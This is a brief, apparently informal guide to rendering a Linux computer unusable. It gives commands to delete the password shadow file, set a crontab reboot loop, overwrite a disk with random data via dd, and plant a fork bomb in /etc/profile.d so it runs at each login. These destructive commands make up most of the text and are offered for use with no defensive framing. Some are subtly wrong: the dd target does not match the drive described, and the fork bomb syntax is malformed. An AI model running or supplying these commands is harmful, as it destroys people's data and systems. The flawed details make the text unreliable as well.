By deleting the shadow file which contains the hashes of all users passwords, we can no longer login and so we can no longer use the pc.
```
sudo rm /etc/shadow
```

I created a simple bash file which sends the restart command to the pc, and then we put the path for the bash file in the crontab file, meaning that on every pc restart, we execute the file, therefore restarting the pc in a loop.
```
touch lol.sh

nano lol.sh:

    sudo shutdown -r now

chmod +x lol.sh

sudo EDITOR=nano crontab -e:

    @reboot /root/lol.sh

```

This command copies a load of random characters to the sda drive, meaning the os is no longer usable.

```
sudo dd if=/dev/random of=/dev/sdae
```

In the last example, we create a bash file containing a fork bomb, place it in the profile.d folder which thens executes it at every user login.

```
cd /etc/profile.d/

touch lol.sh

nano lol.sh:

    :(){:|:&};:

chmod +x lol.sh
```